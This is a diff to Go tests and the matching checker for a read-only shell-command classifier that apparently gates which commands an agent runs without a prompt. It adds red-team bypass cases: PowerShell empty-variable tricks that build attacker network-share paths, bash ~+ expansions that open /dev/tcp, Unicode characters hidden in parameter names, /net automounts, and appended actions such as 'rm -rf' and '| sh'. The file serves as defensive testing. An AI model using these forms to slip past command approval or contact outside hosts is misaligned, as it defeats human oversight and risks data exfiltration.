@@ -1,10 +1,12 @@
 package osys
 
 import (
+	"path"
 	"regexp"
 	"slices"
 	"strings"
 	"testing"
+	"unicode"
 	"unicode/utf8"
 )
 
@@ -206,6 +208,56 @@ var readOnlyBypasses = []struct{ name, cmd string }{
 	{"git branch --sort=-signature:grade", "git branch --sort=-signature:grade"},
 	{"git branch --sort=describe", "git branch --sort=describe"},
 	{"git describe --broken", "git describe --broken"},
+
+	// Round three (a red team's findings on the finishing pass, and siblings).
+	// PowerShell 5.1 expands an empty or unset variable inside a word, so
+	// \$null\h\s reaches the cmdlet or program as \\h\s (seen with a program
+	// that prints its arguments, for each form below).
+	{"an empty variable builds a network path", `Get-Content \$null\attacker\share\x.txt`},
+	{"an unset variable builds a network path", "Get-Content /$x/attacker/share/x.txt"},
+	{"an empty automatic variable builds a network path", `gci \$PSScriptRoot\attacker\share`},
+	{"an empty variable after -Path:", `Get-Content -Path:\$null\attacker\share\x.txt`},
+	{"an empty variable after -LiteralPath", `Get-Content -LiteralPath \$null\attacker\share\x.txt`},
+	{"an empty variable after a comma", `Get-Content a.txt,\$null\attacker\share\x.txt`},
+	{"an empty variable in double quotes", `type "\$null\attacker\share\x.txt"`},
+	{"an empty variable, WebDAV", `cat \$null\attacker@SSL\DavWWWRoot\x.txt`},
+	{"an empty variable inside echo's bracket", `echo (Get-Content \$null\attacker\share\x.txt)`},
+	{"an empty variable for ls", "ls /$null/attacker/share"},
+	{"an empty variable for dir", `dir \$null\attacker\share`},
+	{"an empty variable for Get-Item", `Get-Item \$null\attacker\share\x.txt`},
+	{"an empty variable for Select-String -Path", `Select-String -Pattern . -Path \$null\attacker\share\x.txt`},
+	{"an empty variable for a program", `head \$null\attacker\share\x.txt`},
+	{"a variable that holds a host", `Get-Content $env:LOGONSERVER\share\x.txt`},
+	// bash expands ~+ (and ~N, ~+N, ~-) to a directory the working directory
+	// decides, then connects for the /dev/tcp it spells (workdir /dev).
+	{"~+ in what < opens", "cat < ~+/tcp/127.0.0.1/9"},
+	{"~+ glued to <", "cat <~+/tcp/127.0.0.1/9"},
+	{"~+ after 0<", "head -c 1 0< ~+/tcp/127.0.0.1/9"},
+	{"~0 for wc", "wc -c < ~0/tcp/127.0.0.1/9"},
+	{"~+0 for grep", "grep x < ~+0/tcp/127.0.0.1/9"},
+	{"~- in what < opens", "cat < ~-/tcp/127.0.0.1/9"},
+	// getopt takes the rest of -1f//h as -f's file.
+	{"a digit before a glued file value", "grep -1f//attacker/share/p.txt x"},
+	{"a digit before du -X's glued value", "du -0X//attacker/share/x ."},
+	// PowerShell reads "" inside a double-quoted part as a quote, sh as two.
+	{"a doubled quote inside a double-quoted part", `head q"a"" //attacker/share/x"" b"`},
+	// PowerShell 5.1 ignores some characters inside a parameter name.
+	{"U+0640 inside -OutVariable", "Get-Date -Out\u0640Variable zz"},
+	{"U+034F inside -OutVariable", "Get-Date -Out\u034fVariable zz"},
+	{"U+0640 after the dash", "Get-Date -\u0640OutVariable zz"},
+	{"U+034F inside -ComputerName", "Get-Process -Computer\u034fName attacker.example"},
+	// The operand after -f or --ignore-file is a file, not the pattern.
+	{"grep -f HOST", "grep -f //attacker x"},
+	{"grep -rf HOST", "grep -rf //attacker x"},
+	{"grep --file HOST", "grep --file //attacker x"},
+	{"rg -f HOST", "rg -f //attacker x"},
+	{"rg --ignore-file HOST", "rg --ignore-file //attacker x"},
+	// An automount that picks the host from the path (macOS, Linux autofs).
+	{"/net/HOST", "cat /net/attacker.example/x"},
+	{"/net/HOST spelled another way", "ls /./net/attacker.example"},
+	{"/net/HOST from a relative path", "cat ../../../../net/attacker.example/x"},
+	// PowerShell's WSMan: drive connects to WinRM.
+	{"WSMan:", `Get-ChildItem WSMan:\localhost`},
 }
 
 // Forms ReadOnly refuses though no harm was shown for them: their effect
@@ -419,6 +471,18 @@ var readOnlyRefused = []struct{ name, cmd string }{
 	{"two quoted pieces, which PowerShell keeps apart", `cat "x"'y'`},
 	{"a variable in what < opens", "wc -l < $HOME/x"},
 	{"a variable after an escaped blank in what < opens", `wc -l < x\ $y`},
+
+	// Round three: what a variable holds is not in the line, for any word but
+	// echo and Write-Output, which only print it.
+	{"a variable for cat", "cat $HOME/.profile"},
+	{"a variable for ls", "ls $HOME"},
+	{"a variable in double quotes", `grep x "$HOME/notes.txt"`},
+	{"a doubled single quote", "head a'b''c'"},
+	{"four double quotes", `head """"`},
+	{"~user in what < opens", "cat < ~root/x"},
+	{"/net alone after .., any word", "ls ../net/x"},
+	{"WSMan: in capitals after -Path:", `Get-Item -Path:WSMAN:\localhost`},
+	{"a non-ASCII letter in an option", "ls -lé"},
 }
 
 // The plain forms must go on running without a prompt.
@@ -438,7 +502,7 @@ var readOnlyPlain = []string{
 	"git branch --contains HEAD", "git branch --merged main", "git branch --sort=-committerdate --format=%H",
 	"git remote", "git remote -v", "git remote get-url origin", "git remote get-url --push origin",
 	"git remote show -n origin", "git remote show origin -n",
-	"ls -la", "ls -la | grep x", "ls ~/src", "ls *.go", "cat x | grep y | wc -l", "cat $HOME/.profile",
+	"ls -la", "ls -la | grep x", "ls ~/src", "ls *.go", "cat x | grep y | wc -l",
 	"echo $(whoami)", "echo $(echo $(whoami))", "echo $(whoami) $(pwd)", "echo $(find . -name x)", "echo hi # a note",
 	"echo \"it's\"", "echo 'say \"hi\"'", "grep -E \"a b\" f", "grep -rn TODO .", "wc -l < file", "ls &",
 	"ls\npwd", "ls\r\npwd", "ls;", "\tls\t", "ls\t-la",
@@ -477,6 +541,12 @@ var readOnlyPlain = []string{
 	"git log --no-show-signature -1", "ps -p 1", "Get-Process -Id 1", "cat 'notes.txt'", "grep 'x y' f",
 	"git log --format='%h %s' -n'3'", "cat < go.mod", "wc -l <go.mod", "echo 'a\"b'", "Select-String \"it's\" x",
 	"brew info python@3.12", "brew list --cask", "brew info --json=v2 jq libxml2",
+	// Round three: the nearest neighbours that only look. echo prints what a
+	// variable holds; a single-quoted $ is text in both shells; ~ and ~/ are
+	// the home; //go:build stays grep's pattern after a flag that takes none.
+	"echo $HOME", "echo $env:PATH", "echo \\$null\\h\\s", "grep 'x$' f", "cat < ~/notes.txt", "cat ~/x",
+	"grep -i //go:build f", "rg -e //x f", "git log --grep=http://example.com/x -1", "ls net/x", "ls -1 src",
+	"Get-ChildItem Env:", "Get-Content Variable:PSHOME",
 }
 
 func TestReadOnlyBypasses(t *testing.T) {
@@ -523,17 +593,21 @@ var (
 	roAssignment  = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)
 	roNumber      = regexp.MustCompile(`^[0-9]+$`)
 	roNetworkPath = regexp.MustCompile(`^[\\/]{2,}[^\\/\s]+[\\/]`) // \\host\share, //host/share
-	roStrictWords = map[string]bool{"env": true, "date": true, "hostname": true, "find": true, "sort": true, "uniq": true, "tree": true, "file": true, "rg": true, "git": true, "brew": true}
-	roCmdlets     = map[string]bool{"get-childitem": true, "gci": true, "dir": true, "ls": true, "get-item": true, "get-content": true, "cat": true, "type": true, "get-location": true, "pwd": true, "get-process": true, "ps": true, "get-date": true, "select-string": true, "write-output": true, "echo": true, "sort": true}
-	roGitVerbs    = map[string]bool{"status": true, "log": true, "diff": true, "show": true, "rev-parse": true, "ls-files": true, "blame": true, "describe": true, "branch": true, "remote": true}
-	roFindActs    = map[string]bool{"-delete": true, "-exec": true, "-execdir": true, "-ok": true, "-okdir": true, "-fprint": true, "-fprint0": true, "-fprintf": true, "-fls": true}
-	roBranchActs  = map[string]bool{"-d": true, "-D": true, "-m": true, "-M": true, "-c": true, "-C": true, "-f": true, "--force": true, "--delete": true, "--move": true, "--copy": true, "-u": true, "--set-upstream-to": true, "--unset-upstream": true, "--edit-description": true, "--track": true, "-t": true}
+	// A network path glued to an option, after letters and digits (-1f//h/s).
+	roGluedNetworkPath = regexp.MustCompile(`^-[A-Za-z0-9-]*[:=]?[\\/]{2,}[^\\/\s]+[\\/]`)
+	roHostAlone        = regexp.MustCompile(`^[\\/]{2,}[^\\/\s]+$`)
+	roStrictWords      = map[string]bool{"env": true, "date": true, "hostname": true, "find": true, "sort": true, "uniq": true, "tree": true, "file": true, "rg": true, "git": true, "brew": true}
+	roCmdlets          = map[string]bool{"get-childitem": true, "gci": true, "dir": true, "ls": true, "get-item": true, "get-content": true, "cat": true, "type": true, "get-location": true, "pwd": true, "get-process": true, "ps": true, "get-date": true, "select-string": true, "write-output": true, "echo": true, "sort": true}
+	roGitVerbs         = map[string]bool{"status": true, "log": true, "diff": true, "show": true, "rev-parse": true, "ls-files": true, "blame": true, "describe": true, "branch": true, "remote": true}
+	roFindActs         = map[string]bool{"-delete": true, "-exec": true, "-execdir": true, "-ok": true, "-okdir": true, "-fprint": true, "-fprint0": true, "-fprintf": true, "-fls": true}
+	roBranchActs       = map[string]bool{"-d": true, "-D": true, "-m": true, "-M": true, "-c": true, "-C": true, "-f": true, "--force": true, "--delete": true, "--move": true, "--copy": true, "-u": true, "--set-upstream-to": true, "--unset-upstream": true, "--edit-description": true, "--track": true, "-t": true}
 	// What date and hostname print with, written out again here rather than
 	// read from the classifier's tables.
 	roDateShows     = map[string]bool{"-u": true, "--utc": true, "--universal": true, "-R": true, "--rfc-email": true, "--rfc-2822": true, "--iso-8601": true, "-I": true, "-Idate": true, "-Ihours": true, "-Iminutes": true, "-Iseconds": true, "-Ins": true}
 	roHostnameShows = map[string]bool{"-f": true, "-s": true, "-i": true, "-I": true, "-A": true, "-d": true, "--fqdn": true, "--long": true, "--short": true, "--ip-address": true, "--all-ip-addresses": true, "--all-fqdns": true, "--domain": true}
 	roAppendedActs  = []string{"; rm -rf x", " | sh", " && sudo ls", "\nrm x", " > out", "; x=1", " | xargs rm", "; (Get-Item x).Delete()", " `id`", "; ./ls", "; env sh", "; $(echo rm x)", "; [IO.File]::Delete('x')", " | sort { rm x }", "\rrm x",
 		"  [DANGER: x]; rm -rf x", "; git status --help", "; cat //host/share/x", "; cat < /dev/tcp/host/80", "; HEAD x", "; sort -T . x", "; file -p x",
+		`; cat \$null\h\s\x`, "; cat < ~+/tcp/h/80", "; grep -1f//h/s/x x", "; Get-Date -OutـVariable z", "; grep -f //h x", "; cat /net/h/x",
 		"; cat 'x'//host/share/y", "; head '/\"/host/share/y'", "; cat < /dev/t'c'p/host/80", "; git branch --sort=signature", "; Get-Date -p v", "; head @x"}
 	roPrefixedActs = []string{"sudo ", "X=1 ", "exec ", "command ", "time ", "nohup ", "xargs ", "rm x; ", "$(echo sh) "}
 )
@@ -544,6 +618,13 @@ func roLong(a, name string) bool {
 	long, isLong := strings.CutPrefix(a, "--")
 	long, _, _ = strings.Cut(long, "=")
 	return isLong && long != "" && strings.HasPrefix(name, long)
+}
+
+// roTakesFile reports an option of grep or rg whose next argument is a file:
+// -f (also last in a cluster), --file, --ignore-file, --exclude-from.
+func roTakesFile(a string) bool {
+	return (strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.HasSuffix(a, "f")) ||
+		roLong(a, "file") || roLong(a, "ignore-file") || roLong(a, "exclude-from")
 }
 
 // roShort reports whether a is a single-dash cluster holding one of letters.
@@ -639,9 +720,22 @@ func readOnlyViolation(c string) string {
 			return "the command word " + f[0] + " is not a bare read-only word"
 		}
 		given := roSplit(piece)
-		for _, a := range given {
-			if roNetworkPath.MatchString(a) {
+		for i, a := range given {
+			if roNetworkPath.MatchString(a) || roGluedNetworkPath.MatchString(a) {
 				return "an argument is a network path: " + a
+			}
+			if i > 0 && roHostAlone.MatchString(a) && roTakesFile(given[i-1]) {
+				return "a file option names a host: " + given[i-1] + " " + a
+			}
+			if strings.Contains(strings.ToLower(a), "wsman:") {
+				return "WSMan: connects to WinRM: " + a
+			}
+			if strings.HasPrefix(a, "-") && strings.IndexFunc(a, func(r rune) bool { return r > unicode.MaxASCII }) >= 0 {
+				return "PowerShell ignores some characters in a parameter name: " + a
+			}
+			if c := path.Clean(a); (strings.HasPrefix(a, "/") || strings.HasPrefix(a, "..")) &&
+				(strings.HasPrefix(c, "/net/") || strings.HasPrefix(strings.TrimLeft(c, "./"), "net/")) {
+				return "an automount picks the host: " + a
 			}
 			if p, _, _ := strings.Cut(strings.ToLower(a), ":"); (word == "ps" || word == "get-process") && (p == "-cn" || (len(p) > 1 && strings.HasPrefix("-computername", p))) {
 				return "Get-Process asks another machine: " + a
@@ -686,6 +780,15 @@ func readOnlyViolation(c string) string {
 			if closed && quoteStarts && r != ' ' && r != '\t' {
 				return "PowerShell splits a quoted start from the text after it"
 			}
+			// PowerShell reads '' in single quotes and "" in double quotes as
+			// one quote character; sh closes and opens again.
+			if closed && r == prev {
+				return "PowerShell reads a doubled quote as a quote character"
+			}
+			// What a variable holds is not in the line (echo only prints it).
+			if r == '$' && quote != '\'' && word != "echo" && word != "write-output" {
+				return word + " takes a variable"
+			}
 			closed = false
 			switch {
 			case quote == 0 && (r == '\'' || r == '"'):
@@ -720,7 +823,12 @@ func readOnlyViolation(c string) string {
 					target.WriteByte(ch)
 				}
 			}
-			if t := target.String(); strings.Contains(t, "$") || strings.Contains(t, "/dev/tcp/") || strings.Contains(t, "/dev/udp/") {
+			// bash expands ~+, ~-, ~N and ~user there; only ~ and ~/ are the home.
+			t := target.String()
+			if strings.HasPrefix(t, "~") && t != "~" && !strings.HasPrefix(t, "~/") {
+				return "< opens a path bash expands from ~: " + t
+			}
+			if strings.Contains(t, "$") || strings.Contains(t, "/dev/tcp/") || strings.Contains(t, "/dev/udp/") {
 				return "< opens a connection, or a name only expansion tells: " + t
 			}
 		}
